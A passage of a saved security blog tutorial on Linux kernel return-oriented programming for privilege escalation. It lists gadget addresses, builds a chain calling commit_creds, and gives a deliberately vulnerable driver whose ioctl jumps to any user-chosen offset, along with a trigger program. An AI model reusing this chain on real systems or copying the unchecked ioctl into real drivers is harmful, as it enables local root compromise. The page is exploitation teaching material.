0xffffffff8158fb9a : adc ah, bl ; loopne 0xffffffff8158fba4 ; xor eax, eax ; pop rbp ; re
</pre>
<p>Note that the Intel syntax is used the ROPgadget tool. Now we can search for the ROP gadgets listed in our privilege escalaltion ROP chain. The first gadget we need is <code>pop %rdi; ret</code>:</p>
<pre>vnik@ubuntu:~$ grep  ': pop rdi ; ret' ropgadget  
0xffffffff810c9ebd : pop rdi ; ret</pre>
<p>Obviously any of the gadgets above can be used. However, if we do decide to use one of the gadgets followed by <code>ret [some_num]</code>, we will need to construct our ROP chain accordingly, taking into account the fact that the stack pointer will be incremented (remember the stack grows towards lower memory addresses) by <code>[some_num]</code>. We will demonstrate this in practice in Part 2 of this tutorial. Note that a gadget may be located in a non-executable page. In this case, an alternative gadget must be found.</p>
<p>There are no gadgets <code>mov %rax, %rdi; ret</code> in the test kernel. However, there are several gadgets for <code>mov %rax, %rdi</code> followed by a <code>call</code> instruction:</p>
<pre>0xffffffff8143ae19 : mov rdi, rax ; call r12
0xffffffff81636240 : mov rdi, rax ; call r14
0xffffffff811b22c2 : mov rdi, rax ; call r15
0xffffffff810d7f63 : mov rdi, rax ; call r8
0xffffffff81184c73 : mov rdi, rax ; call r9
0xffffffff815b4593 : mov rdi, rax ; call rbx
0xffffffff810d805d : mov rdi, rax ; call rcx
0xffffffff81036b70 : mov rdi, rax ; call rdx</pre>
<p>We can adjust our initial ROP chain to accommodate for the <code>call</code> instruction by loading the address of <code>commit_creds()</code> into <code>%rbx</code>. The <code>call</code> instruction will then execute <code>commit_creds()</code> with <code>%rdi</code> pointing to our new "root" cred structure.</p>
<center><a class="asset-img-link" href="https://www.trustwave.com/images/slblog-03-02-2018-10-57-10/spiderlabs/4c42f040-51b7-4b0a-a725-4eb9524db8f1.png" style="display: inline;"><img alt="Rop_chain2" border="0" class="asset  asset-image at-xid-6a0133f264aa62970b01b7c86b399a970b img-responsive" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/0b8517e9-6101-4ad9-822a-63e429751862.png" title="Rop_chain2"></a></center>
<p><br>Executing the above ROP chain should escalate privileges of the current process to root.</p>
<h4>Vulnerable Driver</h4>
<p>To simplify the exploitation process and demonstrate the kernel ROP chain in practice, we have developed the following <a href="https://github.com/vnik5287/kernel_rop">vulnerable driver</a>:</p>
<pre>struct drv_req {
        unsigned long offset;
};
...


static long device_ioctl(struct file *file, unsigned int cmd, unsigned long args) {
        struct drv_req *req;
        void (*fn)(void);

        switch(cmd) {
        case 0:
                req = (struct drv_req *)args;
                printk(KERN_INFO "size = %lx\n", req-&gt;offset);
                printk(KERN_INFO "fn is at %p\n", &amp;ops[req-&gt;offset]);
                fn = &amp;ops[req-&gt;offset];                                     [1]
                fn();
                break;
        default:
                break;
        }

        return 0;
}
</pre>
<p>In [1], there are no bound checks for the array. A user-supplied offset is large enough (represented by unsigned long) to access any memory address in user or kernel space.</p>
<p>This driver registers the <code>/dev/vulndrv</code> device and prints the <code>ops</code> array address when loaded:</p>
<pre>vnik@ubuntu:~/kernel_rop$ make &amp;&amp; sudo insmod ./drv.ko
make -C /lib/modules/3.13.0-32-generic/build M=/home/vnik/kernel_rop modules
make[1]: Entering directory `/usr/src/linux-headers-3.13.0-32-generic'
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: Leaving directory `/usr/src/linux-headers-3.13.0-32-generic'
[sudo] password for vnik: 
vnik@ubuntu:~/kernel_rop$ dmesg | tail
[ 1876.256007] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None
[ 1878.259739] e1000: eth0 NIC Link is Down
[ 1884.274250] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None
[ 3325.908438] drv: module verification failed: signature and/or  required key missing - tainting kernel
[ 3325.909211] addr(ops) = ffffffffa0253340
</pre>
<p>We can reach the vulnerable path via the provided ioctl from user space:</p>
<pre>vnik@ubuntu:~/kernel_rop/vulndrv$ sudo chmod a+r /dev/vulndrv 
vnik@ubuntu:~/kernel_rop/vulndrv$ ./trigger [offset]
</pre>
<p>The trigger source code is shown below:</p>
<pre>#define DEVICE_PATH "/dev/vulndrv"
...

int main(int argc, char **argv) {
        int fd;
        struct drv_req req;

        req.offset = atoll(argv[1]);

        fd = open(DEVICE_PATH, O_RDONLY);

        if (fd == -1) {
                perror("open");
        }

        ioctl(fd, 0, &amp;req);

        return 0;
}
</pre>
<p>By providing a precomputed offset, any memory address in kernel space can be executed. We could obviously point <code>fn()</code> to our mmap'd user-space memory address (containing the privilege escalation payload) but remember the initial requirement: no instructions residing in user space should be executed.</p>
<p>We need a way to redirect the kernel execution flow to our ROP chain in user space without executing any user-space instructions. We will leave this for Part 2.</p>
<h4>Stay tuned for Part 2!</h4>
<p>We have deliberately skipped some details regarding pivoting to our ROP chain and fixating the system once privileges are elevated. We will discuss these topics in Part 2. You are encouraged to attempt this exercise on your own before Part 2 becomes available :) The source code for the kernel driver and user-space trigger program is available on <a href="https://github.com/vnik5287/kernel_rop">GitHub</a>.</p>
<p>Stay tuned for Part 2!</p>
<hr>
<pre><sup id="fn1">1. [Linux kernels that come with distributions by default.]<a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/#r1" title="Back to footnote 1 in the text.">↩</a></sup></pre>
                                </div>
                            </div>

                        </div>
                    </article>
                </div>
            </div>
        </div>
    </div>
</section>

<section class="section bg-gray-lighter angle-top angle-top-gray-lightest">
    <div class="angle-top-placeholder"></div>
    <div class="angle-bottom-placeholder"></div>



<div class="container">

        <h2 class="text-center ">Related SpiderLabs Blogs</h2>
    <ul class="slick-filter nav nav-tabs">

    </ul>
    <div class="row card-list card-list-slick-resources slick-uninitialized slick-initialized slick-slider" data-slick="{&quot;autoplay&quot;:false}"><div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 879px; transform: translate3d(0px, 0px, 0px);"><div class="slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: 293px;"><div><div class="col-sm-6 col-md-4 col-lg-3 card-list-item blogs" data-tags="blogs" style="width: 100%; display: inline-block;">
            <div class="card">
                        <div class="card-media">
                            <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/introducing-password-cracking-manager-crackq/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="Introducing" password="" cracking="" manager:="" crackq="" data-ga-value="1" tabindex="0">
                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
                            </a>
                        </div>
                <div class="card-body card-body-overflow" style="height: 160px;">
                    <p class="mbx">1 year ago</p>
                    <h4 class="mbn"><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/introducing-password-cracking-manager-crackq/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="Introducing" password="" cracking="" manager:="" crackq="" data-ga-value="1" tabindex="0">Introducing Password Cracking Manager: CrackQ</a></h4>
                </div>
                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
            </div>

                    </div></div></div><div class="slick-slide slick-active" data-slick-index="1" aria-hidden="false" style="width: 293px;"><div><div class="col-sm-6 col-md-4 col-lg-3 card-list-item blogs" data-tags="blogs" style="width: 100%; display: inline-block;">
            <div class="card">
                        <div class="card-media">
                            <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/missing-critical-vulnerabilities-through-narrow-scoping/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="Missing" critical="" vulnerabilities="" through="" narrow="" scoping="" data-ga-value="1" tabindex="0">
                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
                            </a>
                        </div>
                <div class="card-body card-body-overflow" style="height: 160px;">
                    <p class="mbx">2 months ago</p>
                    <h4 class="mbn"><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/missing-critical-vulnerabilities-through-narrow-scoping/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="Missing" critical="" vulnerabilities="" through="" narrow="" scoping="" data-ga-value="1" tabindex="0">Missing Critical Vulnerabilities Through Narrow Scoping</a></h4>
                </div>
                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
            </div>

                    </div></div></div><div class="slick-slide slick-active" data-slick-index="2" aria-hidden="false" style="width: 293px;"><div><div class="col-sm-6 col-md-4 col-lg-3 card-list-item blogs" data-tags="blogs" style="width: 100%; display: inline-block;">
            <div class="card">
                        <div class="card-media">
                            <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/how-lack-of-awareness-and-clinging-to-the-past-threaten-your-networks/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="How" lack="" of="" awareness="" and="" clinging="" to="" the="" past="" threaten="" your="" networks="" data-ga-value="1" tabindex="0">
                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
                            </a>
                        </div>
                <div class="card-body card-body-overflow" style="height: 160px;">
                    <p class="mbx">2 months ago</p>
                    <h4 class="mbn"><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/how-lack-of-awareness-and-clinging-to-the-past-threaten-your-networks/" data-ga-hittype="event" data-ga-category="cta_carousel" data-ga-action="click" data-ga-label="How" lack="" of="" awareness="" and="" clinging="" to="" the="" past="" threaten="" your="" networks="" data-ga-value="1" tabindex="0">How Lack of Awareness and Clinging to the Past Threaten Your Networks</a></h4>
                </div>
                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
            </div>

                    </div></div></div></div></div></div>
</div>

</section>

    </main>




<footer class="site-footer">
    <div class="position-relative">
        <button onclick="" class="shape shape-circle shape-md shape-shadow text-white bg-primary position-absolute top-0 start-50 translate-middle to-top">
            <span class="fe fe-chevron-up"></span>
        </button>
    </div>
    <section class="bg-darkest pt-12 pb-7">
        <div class="container">
            <div class="pb-7">
                <div class="row align-items-center">
                    <div class="col-8 col-sm-4 col-md-4 col-lg-3 order-1">
                        <p class="mb-7"><img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/trustwave-logo-white.svg" alt="Trustwave" class="img-fluid"></p>
                    </div>
                    <div class="col-12 col-xl-5 order-2 order-md-3">
                        <ul class="list-unstyled row row-cols-3 row-cols-sm-auto justify-content-xl-center gy-2 gx-6 mb-7">
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/" class="link-muted">About</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/contact/" class="link-muted">Contact</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/support/" class="link-muted">Support</a></li>
                            <li class="col"><a href="https://jobs.jobvite.com/trustwave" class="link-muted">Careers</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/newsroom/news/" class="link-muted">News Releases</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-md-5 offset-md-3 col-lg-4 offset-lg-4 col-xl-4 offset-xl-0 order-3 order-md-2 order-xl-3">
                        <form method="get" target="_self" action="https://www.trustwave.com/en-us/search/">
                            <div class="mb-7">
                                <input type="text" class="form-control" id="q" name="q" placeholder="Search trustwave.com">
                            </div>
                        </form>
                    </div>
                </div>
                <div class="pt-7 pb-10">
                    <div class="callout callout-horizontal-lg" style="background-color: rgba(255,255,255,0.05);">
                        <div class="callout-header bg-primary">
                            <h3 class="text-white mb-0">Stay Informed</h3>
                        </div>
                        <div class="callout-body">
                            <div class="row align-items-center">
                                <div class="col-lg-5">
                                    <p class="lead text-white text-center text-lg-start mb-lg-0">Sign up to receive the latest security news and trends from Trustwave.</p>
                                </div>
                                <div class="col-lg-7">
                                    <form method="get" target="_blank" action="https://www2.trustwave.com/Subscription-Center-Subscribe.html">
                                        <div class="row g-7">                                            
                                            <div class="col-md-6 col-lg-7">
                                                <input type="text" class="form-control" name="Email" placeholder="Email Address">
                                            </div>
                                            <div class="col-md-6 col-lg-5">
                                                <button class="btn btn-primary w-100" type="submit">Subscribe</button>
                                            </div>                                            
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-12 col-lg-3">
                        <h6 class="text-light border-bottom border-darker pb-2">Services</h6>
                        <ul class="list-unstyled row row-cols-1 row-cols-sm-2 row-cols-lg-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/managed-detection-and-response/" class="link-muted">Managed Detection &amp; Response</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/managed-security-services/" class="link-muted">Managed Security Services</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/consulting-and-professional-services/" class="link-muted">Consulting &amp; Professional Services</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/penetration-testing/" class="link-muted">Penetration Testing</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/database-security/" class="link-muted">Database Security</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/email-security/" class="link-muted">Email Security</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/services/" class="link-muted">All Services</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-3">
                        <h6 class="text-light border-bottom border-darker pb-2">Why Trustwave</h6>
                        <ul class="list-unstyled row row-cols-1 row-cols-sm-2 row-cols-lg-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/" class="link-muted">The Trustwave Approach</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/spiderlabs/" class="link-muted">Trustwave SpiderLabs</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/spiderlabs-fusion-center/" class="link-muted">SpiderLabs Fusion Center</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/trustwave-fusion-platform/" class="link-muted">Trustwave Fusion Platform</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/security-operations-centers/" class="link-muted">Securing Operation Centers</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-3">
                        <h6 class="text-light border-bottom border-darker pb-2">Partners</h6>
                        <ul class="list-unstyled row row-cols-1 row-cols-sm-2 row-cols-lg-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/alliance-ecosystem/technology-partners/" class="link-muted">Global Technology Partners</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/partnerone/" class="link-muted">PartnerOne Program</a></li>
                            <li class="col"><a href="https://trustwave.ziftone.com/#/page/reg" class="link-muted">Become a Partner</a></li>
                            <li class="col"><a href="https://trustwave.ziftone.com/#/login" class="link-muted">PartnerOne Portal Login</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-3">
                        <h6 class="text-light border-bottom border-darker pb-2">Company</h6>
                        <ul class="list-unstyled row row-cols-1 row-cols-sm-2 row-cols-lg-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/leadership/" class="link-muted">Leadership Team</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/our-history/" class="link-muted">Our History</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/about-us/accolades/" class="link-muted">Awards &amp; Accolades</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/global-locations/" class="link-muted">Global Locations</a></li>
                            <li class="col"><a href="https://jobs.jobvite.com/trustwave" class="link-muted">Careers</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/newsroom/media/" class="link-muted">Media Coverage</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/newsroom/news/" class="link-muted">News Releases</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-4">
                        <h6 class="text-light border-bottom border-darker pb-2">Solutions by Topic</h6>
                        <ul class="list-unstyled row row-cols-1 row-cols-sm-2 row-cols-lg-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/mitigate-microsoft-exchange-server-attacks/" class="link-muted">Microsoft Exchange Server Attacks</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-topic/cloud-security/" class="link-muted">Securing the Cloud</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-topic/rapidly-secure-temporary-infrastructures/" class="link-muted">Rapidly Securing New Environments</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-topic/securing-the-iot-landscape/" class="link-muted">Securing the IoT Landscape</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-4">
                        <h6 class="text-light border-bottom border-darker pb-2">Solutions by Industry</h6>
                        <ul class="list-unstyled row row-cols-2 row-cols-sm-3 row-cols-lg-2 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/education/" class="link-muted">Education</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/financial-sector/" class="link-muted">Financial Sector</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/government/" class="link-muted">Government</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/healthcare/" class="link-muted">Healthcare</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/hotels/" class="link-muted">Hotels</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/legal/" class="link-muted">Legal</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/payment-services/" class="link-muted">Payment Services</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/restaurants/" class="link-muted">Restaurants</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-industry/retail/" class="link-muted">Retail</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-4">
                        <h6 class="text-light border-bottom border-darker pb-2">Solutions by Regulation</h6>
                        <ul class="list-unstyled row row-cols-2 row-cols-sm-3 row-cols-lg-2 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/data-privacy/" class="link-muted">Data Privacy</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/cmmc/" class="link-muted">CMMC</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/fisma/" class="link-muted">FISMA</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/gdpr/" class="link-muted">GDPR</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/glba/" class="link-muted">GLBA</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/hipaa/" class="link-muted">HIPAA</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/iso/" class="link-muted">ISO</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/pci/" class="link-muted">PCI</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/capabilities/by-mandate/sox/" class="link-muted">SOX</a></li>
                        </ul>
                    </div>
                    <div class="col-6 col-lg-2">
                        <h6 class="text-light border-bottom border-darker pb-2">Blogs</h6>
                        <ul class="list-unstyled row row-cols-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/blogs/trustwave-blog/" class="link-muted">Trustwave Blog</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/" class="link-muted">SpiderLabs Blog</a></li>
                        </ul>
                    </div>
                    <div class="col-6 col-lg-2">
                        <h6 class="text-light border-bottom border-darker pb-2">Upcoming</h6>
                        <ul class="list-unstyled row row-cols-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/upcoming/webinars/" class="link-muted">Webinars</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/upcoming/events/" class="link-muted">Events</a></li>
                        </ul>
                    </div>
                    <div class="col-12 col-lg-4">
                        <h6 class="text-light border-bottom border-darker pb-2">Media &amp; Assets</h6>
                        <ul class="list-unstyled row row-cols-2 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/library/?type=doc&amp;topics=&amp;categories=&amp;tags=&amp;vidcats=&amp;sort=Newest" class="link-muted">Document Library</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/library/?type=video&amp;topics=&amp;categories=&amp;tags=&amp;vidcats=&amp;sort=Newest" class="link-muted">Video Library</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/library/?type=doc&amp;topics=&amp;categories=Analyst%20Report&amp;tags=&amp;vidcats=&amp;sort=Newest" class="link-muted">Analyst Reports</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/library/?type=webinar&amp;topics=&amp;categories=&amp;tags=&amp;vidcats=&amp;sort=Newest" class="link-muted">Webinar Replays</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/library/?type=doc&amp;topics=&amp;categories=Case%20Study&amp;tags=&amp;vidcats=&amp;sort=Newest" class="link-muted">Case Studies</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/security-resources/special-offers/" class="link-muted">Trials &amp; Evaluations</a></li>
                        </ul>
                    </div>
                    <div class="col-6 col-lg-2">
                        <h6 class="text-light border-bottom border-darker pb-2">Notices</h6>
                        <ul class="list-unstyled row row-cols-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/security-resources/security-advisories/" class="link-muted">Security Advisories</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/resources/security-resources/software-updates/" class="link-muted">Software Updates</a></li>
                        </ul>
                    </div>
                    <div class="col-6 col-lg-2">
                        <h6 class="text-light border-bottom border-darker pb-2">Help</h6>
                        <ul class="list-unstyled row row-cols-1 gy-2 mb-7 small">
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/contact/" class="link-muted">Contact</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/company/support/" class="link-muted">Support</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="pt-7 border-top border-darker">
                <div class="row">
                    <div class="col-12 col-md-5 col-lg-3">
                        <div class="mb-7">
                            <div class="site-footer-language">
                                <div class="site-language-select">
                                    <select class="form-control form-select" id="LangSelector">
                                        <option data-loc="/en-us/" data-lang="en-us" value="en-us">English</option>
                                        <option data-loc="/de-de/" data-lang="de-de" value="de-de">German (Deutsche)</option>
                                        <option data-loc="/ja-jp/" data-lang="ja=jp" value="ja-jp">Japanese (日本語)</option>
                                    </select>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-12 col-md-7 col-lg-4">
                        <div class="mb-7">
                            <div class="row row-cols-auto gx-6 justify-content-md-end justify-content-xl-start">
                                <div class="col">
                                    <a href="https://www.linkedin.com/company/trustwave" class="shape shape-square shape-md link-lightest text-lightest text-decoration-none" style="background-color: rgba(255,255,255,0.05);">
                                        <i class="fe fe-linkedin"></i>
                                    </a>
                                </div>
                                <div class="col">
                                    <a href="https://twitter.com/Trustwave" class="shape shape-square shape-md link-lightest text-lightest text-decoration-none" style="background-color: rgba(255,255,255,0.05);">
                                        <i class="fe fe-twitter"></i>
                                    </a>
                                </div>
                                <div class="col">
                                    <a href="https://www.facebook.com/Trustwave/" class="shape shape-square shape-md link-lightest text-lightest text-decoration-none" style="background-color: rgba(255,255,255,0.05);">
                                        <i class="fe fe-facebook"></i>
                                    </a>
                                </div>
                                <div class="col">
                                    <a href="https://www.youtube.com/channel/UC2CCqdrAxD9-Fv83NOdjhqA" class="shape shape-square shape-md link-lightest text-lightest text-decoration-none" style="background-color: rgba(255,255,255,0.05);">
                                        <i class="fe fe-youtube"></i>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-12 col-lg-5">
                        <ul class="list-unstyled row row-cols-auto small justify-content-xl-end">
                            <li class="col"><a href="https://www.trustwave.com/en-us/legal-documents/" class="link-muted text-nowrap">Legal</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/legal-documents/terms-of-use/" class="link-muted text-nowrap">Terms of Use</a></li>
                            <li class="col"><a href="https://www.trustwave.com/en-us/legal-documents/privacy-policy/" class="link-muted text-nowrap">Privacy Policy</a></li>
                        </ul>
                        <p class="small mb-7 text-xl-end">Copyright ©
                        <script>document.write(new Date().getFullYear())</script>2021 Trustwave Holdings, Inc. All rights reserved.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>
</footer>

<!-- Trustwave Modal and Loading Divs -->
<div class="loading" style="display: none;">Loading</div>

<div class="modal" id="modal"></div>

<div class="modal mktomodal card card-lightbox mfp-hide">

    <div class="card-body">


        <div class="botchallenge" style="display: none;">
            <h2 class="text-center">Help Us Stop the Robot Uprising</h2>

            <p class="text-center text-xl mbx">This is a bot-free zone. Please check the box to let us know you're human.</p>

            <div class="captcha-box">

            </div>
        </div>



        <div class="successdoc" style="display: none;">
            <h2 class="text-center">Thank You</h2>

                <p class="text-center">
                    <a target="_blank" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/#" class="dllinkdoc btn btn-primary mtl" rel="nofollow">Download Now</a>
                </p>
            <hr class="hr-bar">

            <p class="text-center text-lg">Read complimentary reports and insightful stories in the <br><a href="https://www.trustwave.com/en-us/resources/">Trustwave Resource Center</a></p>
        </div>



        <div class="success" style="display: none;">
            <h2 class="text-center">Thank You</h2>

            <p class="text-center text-xl mbx">One of our sales specialists will be in touch shortly.</p>

            <hr class="hr-bar">

            <p class="text-center text-lg">Read complimentary reports and insightful stories in the <br><a href="https://www.trustwave.com/en-us/resources/">Trustwave Resource Center</a></p>
        </div>
        <form></form>
    </div>

</div>

<!-- Javascripts -->
        <script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/legacy.min.js.下載"></script>
        <script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/munchkin.js.下載"></script>
        <script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/player.js.下載"></script>
        <script type="text/javascript" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/addthis_widget.js.下載"></script><div id="_atssh" style="visibility: hidden; height: 1px; width: 1px; position: absolute; top: -9999px; z-index: 100000;"><iframe id="_atssh468" title="AddThis utility frame" style="height: 1px; width: 1px; position: absolute; top: 0px; z-index: 100000; border: 0px; left: 0px;" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/sh.f48a1a04fe8dbf021b4cda1d.html"></iframe></div><style id="service-icons-0"></style>
        <script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/rum.js.下載"></script>
        <script>rum.start("602cc9bb0a513db2b327299487211347");</script><script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/fpv2.min.js.下載"></script>
    <script type="application/ld+json">
        {
        "@context": "http://schema.org",
        "@type": "WebSite",
        "url": "https://www.trustwave.com/",
        "potentialAction": {
        "@type": "SearchAction",
        "target": "https://www.trustwave.com/en-us/search/?q={search_term_string}",
        "query-input": "required name=search_term_string"
        }
        }

        {
        "@context": "http://schema.org",
        "@type": "Organization",
        "url": "https://www.trustwave.com/",
        "logo": "https://www.trustwave.com/img/logo/TW-logo-color.png"
        }
    </script>

            <script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/5142c8f1-532c-427b-a545-0bcfe1f6f4ea.js.下載" type="text/javascript" charset="UTF-8"></script>
            <script type="text/javascript">
                function OptanonWrapper() { }
            </script>


<iframe height="0" width="0" style="display: none; visibility: hidden;" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/activityi.html" id="df-4b707833-4971-435d-bc0f-d4ec5bc0371b"></iframe><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/activityi(1).html" id="df-5dbd6ae7-c3af-4497-839f-1372bad3ee9b"></iframe><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; position: fixed; visibility: hidden; display: block; transition: right 0.3s ease 0s; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/anchor.html" width="256" height="60" role="presentation" name="a-wrnn1wqobjgu" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" id="df-4f5f5442-6aba-4cb8-9967-36b5f48c0fe0"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/saved_resource.html"></iframe></div><div style="display: none; visibility: hidden;"><img id="RRbUJ62CVxF2mfvjKRcV" referrerpolicy="unsafe-url" style="display:none" alt="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/t.gif"><script id="term-e7e5d07437489" src="./2016 - Linux Kernel 